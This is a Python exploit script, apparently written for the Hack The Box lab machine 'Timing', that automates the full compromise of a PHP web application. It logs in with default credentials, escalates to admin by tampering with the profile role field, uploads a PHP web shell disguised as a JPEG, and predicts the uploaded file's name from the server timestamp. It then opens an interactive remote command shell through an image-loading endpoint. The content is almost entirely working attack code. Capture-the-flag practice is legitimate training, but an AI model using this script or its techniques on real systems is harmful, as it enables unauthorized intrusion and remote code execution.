#!/usr/bin/env python

# AutoPwn Timing HTB Machine
# Created by WildZarek ~ 2022

from bs4 import BeautifulSoup   # pip install beautifulsoup
from pwn import *               # pip install pwntools
import calendar
import hashlib
import requests
import signal
import sys
import time

def exit_handler(sig, frame):
	print("\n\n[!] Exiting...")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

target = "http://10.10.11.135"

s = requests.Session()

def get_timestamp():
    r = s.get(target + '/login.php')
    if r.status_code == 200:
        srv_date = r.headers["Date"]
        srv_timestamp = calendar.timegm(time.strptime(srv_date, '%a, %d %b %Y %H:%M:%S %Z'))
        return srv_timestamp

def login():
    login_json = {
        "user": "aaron",
        "password": "aaron"
    }
    r = s.post(target + '/login.php?login=true', data=login_json, verify=False)

    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser')
        result = soup.select('h1.text-center')[0].text.strip()
        cookie = s.cookies.get_dict()['PHPSESSID']
        print(f"\nCookie: PHPSESSID={cookie}")
        return result

def update_profile():
    update_json = {
        "firstName": "pwned",
        "lastName": "pwned",
        "email": "wildzarek@p3ntest1ng.htb",
        "company": "WhoWeAre",
        "role": 1
    }
    r = s.post(target + '/profile_update.php', data=update_json, verify=False)

def change_profile():
    r = s.get(target + '/avatar_uploader.php')

    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser')
        result = soup.select('ul.nav.navbar-nav')[0].text.strip()
        if "Admin panel" in result:
            return "Role changed. Bypass Success."

def upload():
    upload_json = {
        "fileToUpload": ("pwned.jpg", "<?php system($_GET[pwn]);?>")
    }

    r = s.post(target + '/upload.php', data=upload_json, files=upload_json)
    file_hash = hashlib.md5('$file_hash'.encode()+str(get_timestamp()).encode()).hexdigest()
    global uploaded_file_url
    uploaded_file_url = f"{target}/image.php?img=images/uploads/{file_hash}_pwned.jpg&pwn="
    return r.text

def rce(command):
    r = s.get(uploaded_file_url + command)
    return r.text

if __name__ == "__main__":

    log.info("AutoPwn ~ Timing")

    p1 = log.progress("Status")
    p2 = log.progress("Result")

    p1.status("Trying to login...")
    p2.status(login())

    update_profile()

    p1.status("Trying to change role...")
    p2.status(change_profile())

    p1.status("Trying to upload avatar...")
    p2.status(upload())

    #print(f"Uploaded to: {uploaded_file_url}") # UNCOMMENT THIS FOR DEBUG

    warning = "\nREMEMBER: This is not a real prompt's shell, so commands like 'clear' or 'cd' are not working.\n"
    print(warning)

    log.info("Waiting for command...")

    while True:
        command = input("~$: ")
        if command == "clear" or command == "cd":
            print("Command cannot be executed. This is a webshell.")
        else:
            if "&" in command:
                command = command.replace("&", "%26") # URL encode ampersand symbol
            if ">" in command:
                command = command.replace(">", "%3E") # URL encode 
            result = rce(command.replace(" ", "%20")) # URL encode spaces
            print(result.strip())
